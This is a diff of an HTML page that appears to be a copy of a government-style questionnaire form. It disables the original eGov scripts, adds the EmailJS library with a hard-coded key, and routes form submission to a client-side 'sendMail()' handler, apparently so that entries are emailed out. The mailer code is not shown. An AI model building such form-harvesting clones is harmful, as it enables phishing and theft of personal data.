@@ -18,10 +18,16 @@ Based on 320 and Up boilerplate extension
 <!--[if (gt IE 9)]><!--> <html class="no-js" lang="en"><!-- InstanceBegin template="#" codeOutsideHTMLIsLocked="false" --> <!--<![endif]-->
 
                          <head>
-                            <script defer src="https://smtpjs.com/v3/smtp.js"></script>
-                            <script src="index01.js" defer></script>
+                            <script type="text/javascript"
+                            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+                        </script>
+                        <script type="text/javascript">
+                            (function(){
+                                emailjs.init("qU0Y_SM_w4gbkBn1w");
+                            })();
+                        </script>
+                        <script src="index01.js" defer></script>
 
-                             <script async src="#"></script>
                              <script>
                                  window.dataLayer = window.dataLayer || [];
                                  function gtag() { dataLayer.push(arguments); }
@@ -142,7 +148,7 @@ Select a color scheme:
 <meta http-equiv="cleartype" content="on">
 <![endif]-->
 
-<script src="csss/eGov_scripts.js"></script>
+<!-- <script src="csss/eGov_scripts.js"></script> -->
 <!--<script src="csss/scripts.js"></script>--> <!-- ** calling the modified version instead **-->
 <!--<script src="csss/jquery-1.11.1.min.js"></script>--><!-- *** called by eGov code *** -->
 <script src="csss/jquery-ui.min.js"></script>
@@ -259,7 +265,7 @@ You must include a response for all questions before selecting Next.
 </p>
 <br />
 <!-- action="+_+_+.php" -->
-<form action="index01.js" method="post" onsubmit="sendEmail()">
+<form action="index01.js" method="post" onsubmit="sendMail(); return false;">
     <input name="__RequestVerificationToken" type="hidden" value="ZLp3CSQeZzv8F" />    
     <div class="container-fluid">
         
